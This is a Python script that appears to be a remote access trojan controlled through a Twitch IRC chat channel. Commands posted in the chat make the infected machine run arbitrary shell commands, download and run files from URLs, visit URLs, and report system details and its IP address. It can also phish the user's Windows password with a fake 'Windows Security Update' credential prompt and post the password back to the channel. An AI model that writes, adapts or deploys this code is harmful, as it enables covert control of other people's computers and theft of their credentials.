import re
from time import sleep
import socket
import os
import urllib.request
import smtplib, ssl
import platform
import subprocess

HOST = "irc.twitch.tv"
PORT = 6667
NICK = "username"
PASS = "oauth:"
CHAN = "#channel"
RATE = (20 / 30)
CHAT_MSG = re.compile(r"^:\w+!\w+@\w+\.tmi\.twitch\.tv PRIVMSG #\w+ :")
clientName = os.environ['COMPUTERNAME']
EMAIL= 'default@mail.com'
EPASS = 'root'
EPORT = 465  # For SSL
smtp_server = "smtp.gmail.com"
CLIENT_ID = "client id"

def send_mail(receiver, subject, content):
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, EPORT, context=context) as server:
        server.login(EMAIL, EPASS)
        SUBJECT = "TwitchCommand: " + subject
        TEXT = content
        message = 'Subject: {}\n\n{}'.format(SUBJECT, TEXT)
        server.sendmail(EMAIL, receiver, message)

def main():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
        s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
        s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
        connected = True
        chat(s, clientName + " connected.")
    except:
        connected = False

    while connected:
        response = s.recv(1024).decode("utf-8")
        if response == "PING :tmi.twitch.tv\r\n":
            s.send("PONG :tmi.twitch.tv\r\n".encode())
        else:
            #Legacy but possible use in only allowing one user to issue commands
            #username = re.search(r"\w+", response).group(0)
            message = CHAT_MSG.sub("", response).replace("\r\n", "")
            if message == "!list":
                chat(s, clientName + " is online.")
            elif message.startswith('!act'):
                messageArray = message.split(" ")
                if messageArray[1] == 'all' or messageArray[1] == clientName:
                    if messageArray[2] == 'cmd':
                        try:
                            os.system(messageArray[3])
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'de':
                        try:
                            url = messageArray[3]
                            ext = url.split(".")
                            path = os.path.expanduser("~") + "/Downloads/file" + ext[len(ext)-1]
                            urllib.request.urlretrieve(url, path)
                            os.system('start ' + path)
                            sleep(5)
                            os.remove(path)
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'visit':
                        try:
                            urllib.request.urlopen(messageArray[3])
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'exit':
                        chat(s, clientName + " has been disconnected.")
                        connected = False
                    elif messageArray[2] == 'info':
                        try:
                            osInfo = platform.system() + " " + platform.release() + ", " + platform.version()
                            chat(s, clientName + " is running " + osInfo + ". The IP address is " + socket.gethostbyname(socket.gethostname()))
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'mbox':
                        try:
                            command = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(messageArray[3])
                            os.system(command)
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'askpass':
                        try:
                            cmd1 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
                            cmd2 = 'echo $cred.getnetworkcredential().password;'
                            full_cmd = 'Powershell "{} {}"'.format(cmd1, cmd2)
                            test = subprocess.check_output(full_cmd, shell=True);
                            chat(s, clientName + " returned password " + str(test, 'utf-8'))
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    else:
                        chat(s, "Incorrect command usage.")
        sleep(1)

def chat(sock, msg):
    sock.send("PRIVMSG {} :{}".format(CHAN, msg+"\r\n").encode())

main()

